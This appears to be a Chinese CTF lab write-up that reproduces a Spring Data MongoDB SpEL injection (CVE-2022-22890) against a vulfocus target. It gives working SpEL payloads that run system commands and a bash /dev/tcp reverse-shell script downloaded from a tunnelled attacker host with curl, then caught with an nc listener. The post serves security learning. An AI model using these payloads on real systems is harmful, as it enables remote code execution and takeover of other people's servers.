---
title: 'cve_2022_22890漏洞复现-没有公网ip怎么进行反弹shell-spring-data-mongo'
abbrlink: 611828c1
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# cve_2022_22890漏洞复现-没有公网ip怎么进行反弹shell?-spring-data-mongo

## 0x01 漏洞描述：

```
 名称: vulfocus/spring-data-mongo-cve_2022_22890:latest

            描述: 

Spring Data MongoDB SpEL Expression injection

Spring Data MongoDB 应用程序在使用带有 SpEL 表达式的 @Query 或 @Aggregation-annotated 查询方法时容易受到 SpEL 注入的影响，如果输入未经过过滤，则该表达式包含用于值绑定的查询参数占位符。

请求URI：/

请求方式：GET

请求参数：name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('touch /tmp/bmh')


```



![image-20260411142904148](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260411142904253.png)

---



## 0x02 知识点

1.**SpEL（Spring Expression Language）** 

是 Spring 框架的一种表达式语言。当程序将用户可控的字符串直接传入 `SpelExpressionParser.parseExpression().getValue()` 时，SpEL 解析器会执行该字符串。由于 SpEL 支持通过反射调用 Java 类（如 `java.lang.Runtime`），攻击者可以借此执行系统命令。



2.**curl**（Client URL）

**curl**是一个 利用 URL 语法 基于命令行 的**文件传输工具**。

它是一个**客户端（Client）**，支持 HTTP、HTTPS、FTP、TCP 等多种协议。



3.bash

**Bash**（全称 **B**ourne **A**gain **SH**ell）是 Linux 和 Unix 系统中最常用的**命令行解释器**。

也就是说我们平常输入的“ls /”会被bash接收并翻译成内核能看得懂的语言，然后就交给系统去执行了

------



## 0x03 思路构建

由于防火墙的存在，我们不能够直接让靶机把权限给我们。又或者外网不能直接访问内网

所以我们不通过靶机作为服务器，我们作为客户机的方式向他拿权限

因此我们换个思路：**让靶机变成客户端，让他自己把权限交给我们的主机（那么我们现在是服务器了），这也就是反弹shell**

但是我们首先就要解决一个问题：怎么让靶机听话呢？



**1.反弹shell**

可以让靶机自己拿到我们提前准备好的“转交权限”的命令，然后他执行，把权限主动交给我们

这时候我们就只需要在他执行前，准备好tcp隧道和监听端口，让他从这条隧道穿过来，把权限交给那个负责“交易”的端口，



这里有出现了一个问题：我们怎么把命令交给他呢，换句话说靶机是怎么获取到这个脚本命令的呢？



**2.下载脚本**

我们需要准备一个虚拟机，同时让虚拟机变成服务器（这里需要用到python web），在我们自己的虚拟机也就是服务中写入sh文件（脚本）；

然后让虚拟机通过http协议伸手来拿，拿到后下载，然后储存。最后他再用bash运行脚本，进行反弹shell。

---

## 0x04 漏洞复现

### 1.文件和服务器准备

### （1）curl下载

首先我们要让靶机有curl这个功能这样他才能通过http协议成功拿去文件

在linux系统里面下载的命令为：

```
apt-get update
apt-get install -y curl
```

又因为payload格式为：

```
?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('代码')
```

相应的payload为：（总之只要把命令替换掉就ok）

```
?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('apt-get update')
?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('apt-get install -y curl')
```

我这里用的是hackbar插件，记得让箭头转完之后再进行下一个命令

### （2）文件准备

文件准备之前还有两个事情要做：**内网“转”公网（映射）**+**开启python web服务器**

**1.内网“转”公网（映射）**

我们对靶机来说也是外网，因此要准备相应的外网地址方便靶机连接。

文件准备之前我们需要两个 虚拟机ip（en0网卡对应的那个）映射的公网ip：一个负责tcp协议反弹shell，一个负责http下载sh文件

http

```
cpolar http 你的虚拟机ip:7777
```

tcp

```
cpolar tcp 你的虚拟机ip:1389
```

（图中的端口号仅针对于我的这次复现）

![image-20260411145121722](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260411145121826.png)

记住映射后的公网地址和对应的端口

![image-20260411112446043](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260411112446273.png)

``

先说一下

最后需要监听的端口：右图tcp对应的1389端口

``

**2.开启python web服务器**

打开一个虚拟机终端，输入（这里的7777不是强制性的，但要和http里面的端口保持一致）

```
python3 -m httpserver 7777
```



3.**准备一个sh文件，写入反弹shell**

sh内容

```
bash -i >& /dev/tcp/映射的公网ip/端口号 0>&1
```

- 解释：
  - `bash -i`：i为interaction，即互动和交互，启动一个交互式的 Bash。
  - `>& /dev/tcp/[IP]/[PORT]`：将标准输出重定向到指定的 TCP 连接（反弹shell的时候使用tcp协议，因为简单准确）。
  - `0>&1`：将标准输入也重定向到该连接，从而实现远程控制。





### 2.执行shell

#### (1)监听端口

```
nc -lvnp 1389
```

#### (2)下载文件（这里注意1.sh的位置要和你打开python web的位置一样）

```
?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('curl -o /tmp/1.sh http://....cpolar.cn/1.sh')
```

#### (3)执行文件

```
?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('bash /tmp/1.sh')
```

找到负责监听端口的终端，拿到权限后，flag在env里面

![image-20260411112822324](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260411112822489.png)